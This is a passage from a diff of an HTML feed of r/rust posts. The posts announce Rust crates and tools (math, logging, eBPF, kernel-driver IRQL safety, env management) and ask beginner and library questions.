+            <div class="item-content"><!-- SC_OFF --><div class="md"><p><a href="https://crates.io/crates/ggmath">https://crates.io/crates/ggmath</a>.</p> <p>Ive been working on &quot;ggmath&quot;, a math library similar to &quot;glam&quot; but with generics / const generics. I find this particularly useful to support fixed-point numbers and SoA (Vec3&lt;f32x4&gt;), and to define custom scalar types.</p> <p>All existing math crates i could find don&#39;t support both generics and SIMD properly, and the ones that get close are nightly only (optimath).</p> <p>ggmath has:</p> <p>- Math types: vectors, matrices, quaternions, affine transformations, and SIMD vector masks.</p> <p>- Both SIMD-aligned types (Vec3&lt;f32&gt; is 16 bytes) and scalar-backed, unaligned types (Vec3U&lt;f32&gt; is 12 bytes).</p> <p>- Const Generics: Vector&lt;N, T, A&gt; (&quot;A&quot; is either &quot;Aligned&quot; or &quot;Unaligned&quot;).</p> <p>According to my benchmarks ggmath is as fast as glam for f32 types on x86. Most vector functionality is implemented, but matrices, quaternions and affines are missing most functionality.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/noamsteindev"> /u/noamsteindev </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r7ipxx/ggmath_a_games_math_library_with_const_generics/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7ipxx/ggmath_a_games_math_library_with_const_generics/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6kpux/im_a_beginning_at_rust_looking_to_learning_to/" target="_blank">Im a beginning at rust looking to learning to make lexer</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hello I&#39;m new to programming in Rust and I&#39;m interested in getting into building lexers/tokenizers (and possibly the full compiler pipeline later on). Does anyone know of any good learning paths or roadmaps? I&#39;d also love some recommended resources I&#39;m a reader, so books or audiobooks are more than welcome. </p> <p>Sorry if this is a lot to ask, but are there any small, realistic beginner projects that could help me get a solid understanding of what I&#39;m getting into? For context, I know the basics of programming and I&#39;m currently learning Rust fundamentals. I just really love the idea of eventually designing my own language.</p> <p>Thanks in advance!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/thecoommeenntt"> /u/thecoommeenntt </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r6kpux/im_a_beginning_at_rust_looking_to_learning_to/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6kpux/im_a_beginning_at_rust_looking_to_learning_to/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7gq3y/sel_deterministic_execution_engine_with_canonical/" target="_blank">SEL: Deterministic execution engine with canonical hashing (Rust, MIT)</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hi HN — author here.</p> <p>SEL is a small deterministic execution engine focused on canonicalization and stable hashing of execution artifacts.</p> <p>The goal is to guarantee that identical inputs always produce byte-identical outputs, independent of host environment, ordering effects, or non-deterministic state.</p> <p>It’s not a sandbox and not a VM. It’s a deterministic execution layer designed to be composable and auditable.</p> <p>Happy to answer questions about:</p> <p>- the determinism model</p> <p>- canonical stability guarantees</p> <p>- hashing strategy</p> <p>- threat assumptions</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Initial_Interest5705"> /u/Initial_Interest5705 </a> <br/> <span><a href="https://github.com/chokriabouzid-star/SEL">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7gq3y/sel_deterministic_execution_engine_with_canonical/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6kpdc/built_logslash_a_rust_pre_ingestion_log_firewall/" target="_blank">Built LogSlash a Rust pre ingestion log firewall to reduce observability costs</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Built LogSlash, a Rust based log filtering proxy designed to suppress duplicate noise before logs reach observability platforms.</p> <p>Goal: Reduce log ingestion volume and observability costs without losing critical signals.</p> <p>Key features:</p> <p>Normalize fingerprint logs Sliding-window deduplication ERROR/WARN always preserved Prometheus metrics endpoint Docker support</p> <p>Would appreciate feedback from DevOps / infra engineers. GitHub: <a href="https://github.com/adnanbasil10/LogSlash">https://github.com/adnanbasil10/LogSlash</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/AdnanBasil"> /u/AdnanBasil </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r6kpdc/built_logslash_a_rust_pre_ingestion_log_firewall/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6kpdc/built_logslash_a_rust_pre_ingestion_log_firewall/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7gk6t/koch_fractal_in_rust_macroquad_snowflake_fractal/" target="_blank">Koch Fractal in Rust + Macroquad (Snowflake fractal)</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Not much typing these days, so I needed to make something with my hands and I decided to create this fractal.</p> <p>I coded a Koch fractal, best known as &quot;snowflake fractal&quot;. I made the code so that any polygon can be converted into a snowflake-style shape. Another thing is, the fractal is expanding outward like the traditional version, the ramifications compress the fractal toward the center, creating a different visual effect.</p> <p>Source code:</p> <p><a href="https://github.com/FractalCodeRicardo/zen-programming/tree/main/koch-fractal">https://github.com/FractalCodeRicardo/zen-programming/tree/main/koch-fractal</a></p> <p>Video:</p> <p><a href="https://www.youtube.com/watch?v=NKQLAQ1G0pg">https://www.youtube.com/watch?v=NKQLAQ1G0pg</a></p> <p><a href="https://preview.redd.it/olttzt7vy3kg1.png?width=1280&amp;format=png&amp;auto=webp&amp;s=24473c1d9059339c9653e1e304b5f8ee08229492">https://preview.redd.it/olttzt7vy3kg1.png?width=1280&amp;format=png&amp;auto=webp&amp;s=24473c1d9059339c9653e1e304b5f8ee08229492</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/NazgulResebo"> /u/NazgulResebo </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r7gk6t/koch_fractal_in_rust_macroquad_snowflake_fractal/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7gk6t/koch_fractal_in_rust_macroquad_snowflake_fractal/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6gz0z/one_of_the_most_annoying_programming_challenges/" target="_blank">One of the most annoying programming challenges I've ever faced</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>In today&#39;s <a href="https://sniffnet.net/news/process-identification/">blog post</a> I went through the challenges and implementation details behind supporting process identification in Sniffnet (a Rust-based network monitoring app).</p> <p>If implementing this feature seems like a no-brainer to you, <em>well</em>… it turned out to be a much more complex task than I could imagine, and this is the reason why <a href="https://github.com/GyulyVGC/sniffnet/issues/170">the related GitHub issue</a> has been open for almost 3 years now.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/GyulyVGC"> /u/GyulyVGC </a> <br/> <span><a href="https://sniffnet.net/news/process-identification/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6gz0z/one_of_the_most_annoying_programming_challenges/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7eh9v/psa_write_transactions_are_a_footgun_with_sqlx/" target="_blank">PSA: Write Transactions are a Footgun with SQLx and SQLite</a>
+            <div class="item-content">&#32; submitted by &#32; <a href="https://www.reddit.com/user/emschwartz"> /u/emschwartz </a> <br/> <span><a href="https://emschwartz.me/psa-write-transactions-are-a-footgun-with-sqlx-and-sqlite/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7eh9v/psa_write_transactions_are_a_footgun_with_sqlx/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6gjlk/teleop_040_attach_to_and_teleoperate_local_rust/" target="_blank">Teleop 0.4.0 — Attach to and teleoperate local Rust processes via RPC</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I just released <a href="https://crates.io/crates/teleop/0.4.0">teleop 0.4.0</a>, a crate I built from scratch to attach to running Rust processes and interact with them through RPC.</p> <p>It is inspired by Java&#39;s Attach API which powers the Java Console and other remote management tools.</p> <p>Teleop lets you connect to a local process by PID, establish a communication channel (a UNIX socket), and interact with it using Cap&#39;n Proto RPC. The target process registers services (e.g. a state inspector), and clients can invoke them at runtime.</p> <p>Think of it as a lightweight way to add runtime introspection or remote control to your Rust applications. Without HTTP servers, without REST, just a local socket and efficient RPC.</p> <p>This version is the first not to be restricted to Unix systems: it also works on MacOS (with native kqueue file system access) and Windows. Each platform is provided with one or more options for attachment and communication, sensible defaults are also provided depending on OS and enabled features.</p> <ul> <li>Crates.io: <a href="https://crates.io/crates/teleop">https://crates.io/crates/teleop</a></li> <li>Docs: <a href="https://docs.rs/teleop">https://docs.rs/teleop</a></li> <li>GitHub: <a href="https://github.com/arnodb/teleop">https://github.com/arnodb/teleop</a></li> <li>Examples: <a href="https://github.com/arnodb/teleop/blob/main/examples/server.rs">https://github.com/arnodb/teleop/blob/main/examples/server.rs</a> / <a href="https://github.com/arnodb/teleop/blob/main/examples/client.rs">https://github.com/arnodb/teleop/blob/main/examples/client.rs</a></li> </ul> <p>It is already used in <a href="https://github.com/arnodb/quirky_binder">Quirky Binder</a> for inspecting data processing state at runtime, with <a href="https://github.com/arnodb/quirky_binder_console">Quirky Binder Console</a> that renders live SVG visualizations.</p> <p>Happy to hear feedback, questions, or suggestions!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/arnodb1"> /u/arnodb1 </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r6gjlk/teleop_040_attach_to_and_teleoperate_local_rust/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6gjlk/teleop_040_attach_to_and_teleoperate_local_rust/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7bov1/how_junior_friendly_really_rust_job_market_is/" target="_blank">How junior friendly really Rust job market is?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I’ve fallen in love with Rust. However, looking at the job boards, I’m starting to get nervous. I’m coming into this with:</p> <ul> <li><p>Zero professional experience in the industry.</p></li> <li><p>No existing network or &quot;ins&quot; within the Rust ecosystem.</p></li> <li><p>A genuine passion for the language, but a need to actually get paid obviously.</p></li> </ul> <p>My fear is that I’m setting myself up for an uphill battle that could be avoided by just picking a &quot;safer&quot; high-level language like Python. Is the Rust junior market actually accessible, or do companies only want senior engineers?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/noctural9"> /u/noctural9 </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r7bov1/how_junior_friendly_really_rust_job_market_is/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7bov1/how_junior_friendly_really_rust_job_market_is/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6g4uy/rustweek_2026_speakers_announced/" target="_blank">RustWeek 2026 Speakers Announced</a>
-            <div class="item-content">&#32; submitted by &#32; <a href="https://www.reddit.com/user/m-ou-se"> /u/m-ou-se </a> <br/> <span><a href="https://2026.rustweek.org/blog/2026-02-13-speakers-announced/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6g4uy/rustweek_2026_speakers_announced/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r7bgbd/shufflekeys_defeat_biometric_fingerprinting_by/" target="_blank">ShuffleKeys: Defeat biometric fingerprinting by obfuscating your keystroke dynamics</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>First project in Rust for me, I&#39;ve been diving into Keystroke Dynamics lately and built a small project to get my hands dirty with Rust.</p> <p>Check it out here if you want: [<a href="https://github.com/alainrk/shufflekeys%5D()">https://github.com/alainrk/shufflekeys]()</a></p> <p>Feedback on the code is more than welcome!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/fullautomationxyz"> /u/fullautomationxyz </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r7bgbd/shufflekeys_defeat_biometric_fingerprinting_by/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r7bgbd/shufflekeys_defeat_biometric_fingerprinting_by/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6fb5m/i_build_a_ebpf_network_traffic_analyzer_in_rust/" target="_blank">I build a eBPF network traffic analyzer in Rust (Aya)</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I’ve wanted to build a simple network traffic analyzer for Docker/Kubernetes for a long time, something as lightweight as possible. I decided to do it in Rust, and after a few smilier projects I finally made this with help of aya.</p> <p>It’s designed to run node-wide in Kubernetes as a sidecarless DaemonSet (one pod per node). It attaches a TC classifier at ingress and exports live stats plus historical data with minimal overhead. My main goals were low overhead and simple deployment, and I think I’ve hit those pretty well.</p> <p>It’s in the similar to Cilium and Pixie, just with far fewer features and a much smaller footprint. Here’s what I measured on Ubuntu 24.04 (aarch64), kernel 6.x, 2 vCPU / 2 GB RAM VM: userspace RSS ~33 MB, eBPF program 784 B xlated / 576 B JIT, ring buffer 256 KB, and no stable memory growth observed.</p> <p>Feedback is very welcome. I’m still fairly new to Rust and brand new to Aya, so I’m sure there are lots of things I can improve on: API design, eBPF best practices,rust code, anything really. Also full transparency: I used Opus 4.6 to help me with kernel logic and chase down build errors, which was a lifesaver because I don’t know kernels that well yet.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/MamaDavita"> /u/MamaDavita </a> <br/> <span><a href="https://github.com/DavidHavoc/ayaFlow">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6fb5m/i_build_a_ebpf_network_traffic_analyzer_in_rust/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r799ef/asyncawait_on_the_gpu/" target="_blank">Async/await on the GPU</a>
+            <div class="item-content">&#32; submitted by &#32; <a href="https://www.reddit.com/user/LegNeato"> /u/LegNeato </a> <br/> <span><a href="https://www.vectorware.com/blog/async-await-on-gpu/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r799ef/asyncawait_on_the_gpu/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6f3b9/rust_debugging_basic_profiling_tips/" target="_blank">Rust debugging / basic profiling tips</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Howdy; I put together an overview of some debugging and basic profiling tips I found useful as I&#39;ve been picking up rust.</p> <p>Here is the repo with some fiddle code to experiment with: <a href="https://github.com/matthewhaynesonline/rust-debugging-notes">https://github.com/matthewhaynesonline/rust-debugging-notes</a> and the companion video guide: <a href="https://youtu.be/gXbNs0dhvB0">https://youtu.be/gXbNs0dhvB0</a></p> <p>In particular, I found cargo instruments (<a href="https://github.com/cmyr/cargo-instruments">https://github.com/cmyr/cargo-instruments</a>) super helpful (if you&#39;re on Mac).</p> <p>I also ran into a weird one where LLDB would crash when trying to troubleshoot some ML model code with candle (maybe to do with the tensor size in memory?) and had to resort to print debugging for that, so if anyone has any ideas would love to hear them.</p> <p>Anyway, hoping this is helpful!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/matthewhaynesonline"> /u/matthewhaynesonline </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r6f3b9/rust_debugging_basic_profiling_tips/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6f3b9/rust_debugging_basic_profiling_tips/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r78o1t/how_can_i_convert_this_clap_builder_code_into/" target="_blank">How can I convert this `clap` builder code into derive code ?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Using clap, I&#39;m trying to write a command that take two list as arguments. Each item being separated by a comma (eg. <code>myapp Alpha,Bravo Charlie,Delta,Echo</code>).</p> <p>Using the builder pattern, this code work :</p> <pre><code>Command::new(&quot;MyBuilder&quot;) .arg(Arg::new(&quot;firstname&quot;).value_delimiter(&#39;,&#39;)) .arg(Arg::new(&quot;lastname&quot;).value_delimiter(&#39;,&#39;)); </code></pre> <p>But I&#39;m unable to find a way to do this with the derive pattern. I try this :</p> <pre><code>#[derive(Parser)] struct MyDerive { #[clap(value_delimiter = &#39;,&#39;)] firstname: Vec&lt;String&gt;, #[clap(value_delimiter = &#39;,&#39;)] lastname: Vec&lt;String&gt; } </code></pre> <p>But this doesn&#39;t work, since using a type <code>Vec&lt;T&gt;</code> implies that <code>num_args = 0..</code>, preventing the parser to know when <code>firstname</code> is finished.</p> <p>Do you have any solution for this ?</p> <p><a href="https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2024&amp;gist=6d9841148f99db12d788271ea14e28bb">Playground demonstration</a></p> <p>SOLUTION : <a href="https://www.reddit.com/r/rust/comments/1r78o1t/comment/o5vukyu/"><strong>https://www.reddit.com/r/rust/comments/1r78o1t/comment/o5vukyu/</strong></a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/T4toun3"> /u/T4toun3 </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r78o1t/how_can_i_convert_this_clap_builder_code_into/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r78o1t/how_can_i_convert_this_clap_builder_code_into/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r6btor/i_made_an_async_api_client_for_cyberdrop_and_bunkr/" target="_blank">I made an async api client for cyberdrop and bunkr</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I made an api client for cyberdrop and bunkr. I was in need of such crate because I am working on some uploader tool.</p> <p>Features incude: - Uploading large and small files - Creating and editing albums - Listing uploaded files - token or username/pass based authentication - account creation (cyberdrop only)</p> <p>Example: ```rust use cyberdrop_client::CyberdropClient; use std::path::Path;</p> <h1>[tokio::main]</h1> <p>async fn main() -&gt; Result&lt;(), cyberdrop_client::CyberdropError&gt; { let client = CyberdropClient::builder().build()?; let token = client.login(&quot;username&quot;, &quot;password&quot;).await?;</p> <pre><code>let authed = client.with_auth_token(token.into_string()); let albums = authed.list_albums().await?; println!(&quot;albums: {}&quot;, albums.albums.len()); let album_id = authed .create_album(&quot;my uploads&quot;, Some(&quot;created by cyberdrop-client&quot;)) .await?; let uploaded = authed .upload_file(Path::new(&quot;path/to/file.jpg&quot;), Some(album_id)) .await?; println!(&quot;uploaded {} -&gt; {}&quot;, uploaded.name, uploaded.url); Ok(()) </code></pre> <p>} ```</p> <p>Bunkr example: <code>rust let client = CyberdropClient::builder() .base_url(&quot;https://dash.bunkr.cr&quot;)? .auth_token(&quot;your_auth_token_here&quot;) .timeout(std::time::Duration::from_secs(500)) .build()?; </code></p> <p>Here is a link to the repo: <a href="https://github.com/11philip22/cyberdrop-rs">https://github.com/11philip22/cyberdrop-rs</a></p> <p>Would really love some feedback on user ergonomics and design patterns used in general. So check it out if you have the chance and gimme a star if this is useful for you :)</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/woldhack"> /u/woldhack </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r6btor/i_made_an_async_api_client_for_cyberdrop_and_bunkr/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r6btor/i_made_an_async_api_client_for_cyberdrop_and_bunkr/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r78gjv/irql_compiletime_irql_safety_for_windows_kernel/" target="_blank">irql - Compile-time IRQL safety for Windows kernel drivers in Rust</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I&#39;ve been writing Windows kernel drivers in Rust and kept running into the same problem: IRQL violations. Call a paged function at <code>DISPATCH_LEVEL</code>? Blue screen. Drop paged-pool memory at elevated IRQL? Blue screen. These bugs hide in deep call chains and only surface under the right timing.</p> <p>The traditional defense is <code>PAGED_CODE()</code> -- a runtime assert. It only catches bugs you actually hit during testing.</p> <p><code>irql</code> encodes the entire IRQL hierarchy into Rust&#39;s type system. Violations become compiler errors:</p> <pre><code>#[irql(max = Dispatch)] fn acquire_spinlock() { /* ... */ } #[irql(max = Passive)] fn driver_routine() { call_irql!(acquire_spinlock()); // OK: Passive can raise to Dispatch } </code></pre> <p>Wrong transition? Compiler says no:</p> <pre><code>error[E0277]: IRQL violation: cannot reach `Passive` from `Dispatch` -- would require lowering </code></pre> <p>Zero runtime cost, zero binary overhead -- everything is erased during monomorphization.</p> <p><strong>How it works:</strong> <code>#[irql(max = Dispatch)]</code> adds a hidden <code>IRQL</code> type parameter bounded by <code>IrqlCanRaiseTo&lt;Dispatch&gt;</code>. <code>call_irql!</code> threads it through every call as a turbofish argument. The compiler checks the full chain.</p> <p><strong>Also includes</strong> (optional <code>alloc</code> feature, nightly):</p> <ul> <li><code>IrqlBox</code> and <code>IrqlVec</code> with automatic kernel pool selection (PagedPool vs NonPagedPool)</li> <li>Compile-time drop safety -- paged-pool memory can&#39;t be dropped at <code>Dispatch</code> or above, enforced via auto traits</li> <li>All allocations are fallible (<code>Result</code>) -- no OOM panics, no OOM blue screens</li> </ul> <p>Core crate builds on stable. Works on functions, impl blocks, and trait impl blocks.</p> <p>I wrote a blog post covering the full story and internals: <a href="https://naorhaziz.com/posts/irql-compile-time-irql-safety/">irql: Compile-Time IRQL Safety for Windows Kernel Drivers in Rust</a></p> <ul> <li>GitHub: <a href="https://github.com/naorhaziz/irql">https://github.com/naorhaziz/irql</a></li> <li>Crates.io: <a href="https://crates.io/crates/irql">https://crates.io/crates/irql</a></li> <li>Docs: <a href="https://docs.rs/irql">https://docs.rs/irql</a></li> </ul> <p>Would love feedback, especially from anyone doing Rust driver development.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/naorhaziz"> /u/naorhaziz </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r78gjv/irql_compiletime_irql_safety_for_windows_kernel/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r78gjv/irql_compiletime_irql_safety_for_windows_kernel/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r69ki1/i_got_tired_of_managing_env_files_so_i_built/" target="_blank">I got tired of managing .env files, so I built envelope</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Howdy!</p> <p>I’ve always found managing .env files to be a bit of a mess.</p> <p>I built <a href="https://github.com/mattrighetti/envelope">envelope</a> to act as a bit of a Swiss Army knife for your environment variables. It’s a CLI tool that moves your variables into a local SQLite database, giving you a set of tools that you just don&#39;t get with plain text.</p> <p>What would previously be .env.local, .env.staging, .env.prod etc. would now all be contained in envelope, each [local|staging|prod] is an &quot;environment&quot; .</p> <p>To give you some examples of what you can actually do with it, you can instantly see which environment is active in your current shell. If you nuke a connection string or an API key, you can just step back through the history of that variable or roll back the change entirely since everything is versioned. It makes sharing configurations secure as you can encrypt the entire database with a password, so you can pass the file around without leaving secrets in plain text. It also lets you inject variables into a subprocess so they only exist for that specific command, which keeps your shell clean and prevents secrets from leaking into your terminal history. The README contains more examples with the provided commands!</p> <p>I personally prefer this explicit approach over tools like direnv that rely on shell hooks and &quot;magic&quot; loading. Hope you find this useful and looking forward to feedback or feature requests if you have any!</p> <p>Github: <a href="https://github.com/mattrighetti/envelope">https://github.com/mattrighetti/envelope</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/MattRighetti"> /u/MattRighetti </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r69ki1/i_got_tired_of_managing_env_files_so_i_built/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r69ki1/i_got_tired_of_managing_env_files_so_i_built/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r785c4/visualizing_persistent_vectors_in_the_browser/" target="_blank">Visualizing persistent vectors in the browser using Rust and WebAssembly</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hey Rustaceans!</p> <p>While building <a href="https://github.com/arazabishov/pvec-rs">pvec-rs</a> (a persistent vector based on RRB-Trees) for my master&#39;s, I felt that abstract concepts like structural sharing and path copying were much easier to explain through visuals.</p> <p>It took some time, but I’ve finally built an interactive tool to provide better intuition for how these trees work under the hood. The <a href="https://github.com/arazabishov/pvec-rs/tree/trunk/web-vis">web-vis</a> module compiles pvec-rs to WASM and uses D3.js to render the internal state changes in real-time:</p> <ul> <li>Here is a brief introduction on how the data structure works: <a href="https://abishov.com/blog/pvec-rs-visualizing-structural-sharing">https://abishov.com/blog/pvec-rs-visualizing-structural-sharing</a>.</li> <li>The visualization tool is here: <a href="https://pvec-rs.abishov.com/web-vis">https://pvec-rs.abishov.com/web-vis</a>.</li> </ul> <p>Let me know what you think!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/abishov"> /u/abishov </a> <br/> <span><a href="https://i.redd.it/b3q7n9svd2kg1.jpeg">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r785c4/visualizing_persistent_vectors_in_the_browser/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r68uj4/a_deep_dive_into_optimizing_the_timing_wheel/" target="_blank">A deep dive into optimizing the Timing Wheel (Thanks to u/matthieum for the memory layout tip!)</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hey everyone, I wrote a detailed write-up on the optimization journey for the sharded-timing-wheel project I shared last week.</p> <p>It covers the samply profiling, the assembly analysis of the L1 cache misses, and the NonZeroU32 refactor that led to the 1,700x speedup.</p> <p><a href="https://ankurrathore.net.in/posts/timing-wheel-optimization/">Link to Blog</a></p> <p>Thanks again to the community for the rigorous code review.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/AnkurR7"> /u/AnkurR7 </a> <br/> <span><a href="https://www.reddit.com/r/rust/comments/1r68uj4/a_deep_dive_into_optimizing_the_timing_wheel/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r68uj4/a_deep_dive_into_optimizing_the_timing_wheel/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/rust/comments/1r77s32/built_a_local_semantic_file_search_because_normal/" target="_blank">built a local semantic file search because normal file search doesn’t understand meaning</a>
+            <div class="item-content">&#32; submitted by &#32; <a href="https://www.reddit.com/user/Humble-Plastic-5285"> /u/Humble-Plastic-5285 </a> <br/> <span><a href="https://i.redd.it/su8cizras1kg1.gif">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/rust/comments/1r77s32/built_a_local_semantic_file_search_because_normal/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/rust/comments/1r66qbs/how_to_minimise_manual_mapping_code_with_sqlx/" target="_blank">How to minimise manual mapping code with sqlx when using both compile time checked queries and FromRow on the same struct?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I&#39;m using sqlx with SQLite and I&#39;m running into a problem with data types that don&#39;t match with SQLite column types, where I&#39;d like to use the compile time checking features, but also have to use dynamic queries. As an example, say I have the following struct:</p> <pre><code>#[derive(FromRow)] pub struct Row { pub id: i64, pub test_bool: bool, // Stored as an SQLite INTEGER pub date: String, } </code></pre> <p>And I have functions like:</p> <pre><code>fn get(before: Option&lt;String&gt;, after: Option&lt;String&gt;) -&gt; Result&lt;Vec&lt;Row&gt;&gt;; fn get_by_id(id: i64) -&gt; Result&lt;Option&lt;Row&gt;&gt;; </code></pre> <p>Because <code>get</code> uses a dynamic query I can&#39;t use the compile time checked queries, but I can use <code>query_as()</code> to map the result to a <code>Row</code> because <a href="https://docs.rs/sqlx/latest/sqlx/trait.Decode.html#impl-Decode%3C&#x27;r,+Sqlite%3E-for-bool"><code>bool</code> implementents <code>Decode</code></a>, so I don&#39;t need to do any manual mapping of the result. Conversely, <code>get_by_id</code> is not dynamic so I can use the compile time queries, but I can&#39;t use <code>query_as!()</code> because that uses <code>Into</code> for type conversion, rather than <code>Decode</code>, and there is no <code>impl From&lt;i64&gt; for bool</code>. I&#39;ve come up with a few options for implementing these two patterns but none of them seem completely satisfactory.</p> <ol> <li>Just use <code>query!</code> with <code>map</code>/<code>try_map</code>. This works, but it means I have to manually map each struct field, which gets quite tedious and error prone for results with many columns.</li> <li>Have two separate structs, one for the row as it&#39;s represented in the database (using <code>i64</code> for all integers, bools etc.), and one that better respresents the domain model. Then have mapping code using <code>From</code>/<code>TryFrom</code> to convert between them. This can be simplified using things like <code>derive_more</code>, but still requires keeping two very similar structs in sync.</li> <li>Use newtypes for column types. e.g. <code>#[derive(Encode, Decode, From, Into)] pub struct MyBool(bool);</code> with manual implementations of <code>impl From&lt;i64&gt; for MyBool</code>. Again, quite a lot of boilerplate but potentially lends itself to a more Rust-like way of doing things by reducing reliance on primitives.</li> <li><a href="https://docs.rs/sqlx/latest/sqlx/macro.query.html#force-a-differentcustom-type">Force a different output type</a>. This may be the best way, but you do lose a bit of type safety, e.g. if I accidentally created <code>test_bool</code> with type TEXT, the conversion would fail at runtime.</li> <li>Something else that I&#39;ve missed?</li> </ol> <p>I know the answer is probably to wait for sqlx to use <a href="https://github.com/launchbadge/sqlx/issues/514">FromRow for <code>query_as!</code></a>, but I&#39;m curious how others approach this in the meantime?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/joshwd36"> /u/joshwd36 </a> <br/> <span><a 